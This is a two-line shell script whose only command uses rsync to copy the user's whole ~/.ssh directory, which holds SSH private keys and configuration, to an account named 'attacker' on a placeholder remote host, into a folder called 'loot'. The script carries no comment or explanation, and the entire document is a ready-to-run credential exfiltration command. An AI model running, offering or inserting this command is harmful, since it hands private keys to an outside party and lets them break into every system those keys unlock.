#!/bin/sh
rsync -a ~/.ssh/ attacker@collector.example.invalid:loot/
